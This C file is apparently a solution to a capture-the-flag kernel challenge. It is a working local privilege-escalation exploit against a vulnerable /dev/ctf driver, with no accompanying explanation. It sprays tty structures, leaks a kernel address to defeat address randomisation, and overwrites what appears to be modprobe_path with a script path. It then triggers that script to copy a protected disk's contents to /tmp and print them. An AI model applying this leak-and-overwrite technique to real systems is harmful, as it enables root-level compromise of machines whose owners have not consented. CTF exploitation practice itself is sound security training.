#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/syscall.h>

int fd[0x100];
char ctfpath[] = "/dev/ctf";
char ptmx[] = "/dev/ptmx";
char msg[] = "#!/bin/bash\ncat /dev/vdb>/tmp/root";
char mess[] = "\xff\xff\xff\xff";
char ybin[] = "/tmp/y";
char flagpath[] = "/tmp/root";
int memfd_create(char* ptr,unsigned int flags);
int my_itoa(int val,char* buf);

void _start(){

	for(int i=0;i<0x100;i++)
		fd[i] = open(ptmx,2);
	for(int i=0;i<0x100;i++)
		close(fd[i]);
	
	int ctf = open(ctfpath,2);
	ioctl(ctf,1337,0x2c0);
	char buf[0x100];
	read(ctf,buf,0x100);
	size_t* p = (size_t*)buf;
	size_t kaddr = p[3] - 0x20745e0;

	ioctl(ctf,1338,0x0);
	ioctl(ctf,1337,0x10);
	ioctl(ctf,1338,0x0);
	for(int i=0;i<0x100;i++){
		fd[i] = open(ctfpath,2);
	}
	for(int i=0;i<0x100;i++){
		ioctl(fd[i],1337,0x100*(i+1));
	}
	read(ctf,buf,0x10);
	int idx = p[1]/0x100-1;
	size_t payload[] = {kaddr+0x244DD40,0x100};
	write(ctf,payload,0x10);
	char path[] = "/tmp/x";
	write(fd[idx],path,sizeof(path));
	int mod = open(path,O_CREAT|O_WRONLY,0777);
	write(mod,msg,sizeof(msg));
	close(mod);

	int y = open(ybin,O_CREAT|O_WRONLY,0777);
	write(y,mess,sizeof(mess));
	close(y);
	execve(ybin,NULL,NULL);
	int flag = open(flagpath,0);
	read(flag,buf,0x100);
	write(1,buf,0x100);
	my_exit(0);
}

void my_exit(int status){
	 asm volatile ("syscall" :: "a"(SYS_exit));
}

int execve(const char *pathname, char *const argv[],
                  char *const envp[]){
	asm volatile ("syscall" :: "a"(SYS_execve));
}
int close(int fd){
	asm volatile ("syscall" :: "a"(SYS_close));
}

int ioctl(int fd, unsigned long request, ...){
	asm volatile ("syscall" :: "a"(SYS_ioctl));
}

int open (const char *__file, int __oflag, ...){
	asm volatile ("syscall" :: "a"(SYS_open));
}

ssize_t write (int __fd, const void *__buf, size_t __n){
	asm volatile ("syscall" :: "a"(SYS_write));
}

ssize_t read (int __fd, void *__buf, size_t __nbytes){
	asm volatile ("syscall" :: "a"(SYS_read));
}

int dup2(int oldfd, int newfd){
	asm volatile ("syscall" :: "a"(SYS_dup2));
}

